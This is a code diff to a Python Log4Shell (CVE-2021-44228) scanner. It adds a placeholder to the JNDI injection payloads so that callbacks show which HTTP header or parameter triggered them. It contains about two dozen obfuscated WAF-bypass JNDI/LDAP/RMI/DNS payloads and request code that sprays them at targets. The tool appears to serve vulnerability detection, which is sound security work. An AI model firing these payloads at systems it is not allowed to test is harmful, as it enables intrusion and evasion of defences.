@@ -51,29 +51,29 @@ post_data_parameters = ["username", "user", "uname", "name", "email", "email_add
 timeout = 4
 
 waf_bypass_payloads = [
-    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://1.${hostName}.{{callback_host}}/{{random}}}",
-    "${${::-j}ndi:rmi://2.${hostName}.{{callback_host}}/{{random}}}",
-    "${jndi:rmi://3.${hostName}.{{callback_host}}/{{random}}}",
-    "${jndi:rmi://4.${hostName}.{{callback_host}}}/",
-    "${${lower:jndi}:${lower:rmi}://5.${hostName}.{{callback_host}}/{{random}}}",
-    "${${lower:${lower:jndi}}:${lower:rmi}://6.${hostName}.{{callback_host}}/{{random}}}",
-    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://7.${hostName}.{{callback_host}}/{{random}}}",
-    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://8.${hostName}.{{callback_host}}/{{random}}}",
-    "${jndi:dns://9.${hostName}.{{callback_host}}/{{random}}}",
-    "${jnd${123%25ff:-${123%25ff:-i:}}ldap://10.${hostName}.{{callback_host}}/{{random}}}",
-    "${jndi:dns://11.${hostName}.{{callback_host}}}",
-    "${j${k8s:k5:-ND}i:ldap://12.${hostName}.{{callback_host}}/{{random}}}",
-    "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//13.${hostName}.{{callback_host}}/{{random}}}",
-    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://14.${hostName}.{{callback_host}}/{{random}}}",
-    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//15.${hostName}.{{callback_host}}/{{random}}}",
-    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://16.${hostName}.{{callback_host}}/{{random}}}",
-    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//17.${hostName}.{{callback_host}}/{{random}}}",
-    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//18.${hostName}.{{callback_host}}/{{random}}}",
-    "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//19.${hostName}.{{callback_host}}/{{random}}",
-    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//20.${hostName}.{{callback_host}}/{{random}}}",
-    "${jndi:${lower:l}${lower:d}a${lower:p}://21.${hostName}.{{callback_host}}}",
-    "${jnd${upper:i}:ldap://22.${hostName}.{{callback_host}}/{{random}}}",
-    "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://23.${hostName}.{{callback_host}}/{{random}}}"
+    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://#####.1.${hostName}.{{callback_host}}/{{random}}}",
+    "${${::-j}ndi:rmi://#####.2.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:rmi://#####.3.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:rmi://#####.4.${hostName}.{{callback_host}}}/",
+    "${${lower:jndi}:${lower:rmi}://#####.5.${hostName}.{{callback_host}}/{{random}}}",
+    "${${lower:${lower:jndi}}:${lower:rmi}://#####.6.${hostName}.{{callback_host}}/{{random}}}",
+    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://#####.7.${hostName}.{{callback_host}}/{{random}}}",
+    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://#####.8.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:dns://#####.9.${hostName}.{{callback_host}}/{{random}}}",
+    "${jnd${123%25ff:-${123%25ff:-i:}}ldap://#####.10.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:dns://#####.11.${hostName}.{{callback_host}}}",
+    "${j${k8s:k5:-ND}i:ldap://#####.12.${hostName}.{{callback_host}}/{{random}}}",
+    "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//#####.13.${hostName}.{{callback_host}}/{{random}}}",
+    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://#####.14.${hostName}.{{callback_host}}/{{random}}}",
+    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//#####.15.${hostName}.{{callback_host}}/{{random}}}",
+    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://#####.16.${hostName}.{{callback_host}}/{{random}}}",
+    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//#####.17.${hostName}.{{callback_host}}/{{random}}}",
+    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//#####.18.${hostName}.{{callback_host}}/{{random}}}",
+    "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//#####.19.${hostName}.{{callback_host}}/{{random}}",
+    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//#####.20.${hostName}.{{callback_host}}/{{random}}}",
+    "${jndi:${lower:l}${lower:d}a${lower:p}://#####.21.${hostName}.{{callback_host}}}",
+    "${jnd${upper:i}:ldap://#####.22.${hostName}.{{callback_host}}/{{random}}}",
+    "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://#####.23.${hostName}.{{callback_host}}/{{random}}}"
 ]
 
 cve_2021_45046 = [
@@ -164,7 +164,7 @@ def get_fuzzing_headers(payload):
             i = i.strip()
             if i == "" or i.startswith("#"):
                 continue
-            fuzzing_headers.update({i: "header-" + i.lower() + "." + payload})
+            fuzzing_headers.update({i: payload.replace("#####", "header-" + i.lower())})
     if args.exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
@@ -176,7 +176,7 @@ def get_fuzzing_headers(payload):
 def get_fuzzing_post_data(payload, method):
     fuzzing_post_data = {}
     for i in post_data_parameters:
-        fuzzing_post_data.update({i: method + "-" + i + "." + payload})
+        fuzzing_post_data.update({i: payload.replace("#####", method + "-" + i)})
     return fuzzing_post_data
 
 
@@ -306,7 +306,7 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://0.${hostName}.%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://#####.0.${hostName}.%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -322,7 +322,7 @@ def scan_url(url, callback_host):
             try:
                 requests.request(url=url,
                                  method="GET",
-                                 params={"v": payload},
+                                 params={"v": payload.replace("#####", "param-v.")},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
                                  timeout=timeout,
@@ -336,7 +336,7 @@ def scan_url(url, callback_host):
                 # Post body
                 requests.request(url=url,
                                  method="POST",
-                                 params={"v": "param-v." + payload},
+                                 params={"v": payload.replace("#####", "param-v.")},
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload, "data"),
                                  verify=False,
@@ -350,7 +350,7 @@ def scan_url(url, callback_host):
                 # JSON body
                 requests.request(url=url,
                                  method="POST",
-                                 params={"v": payload},
+                                 params={"v": payload.replace("#####", "param-v.")},
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload, "json"),
                                  verify=False,
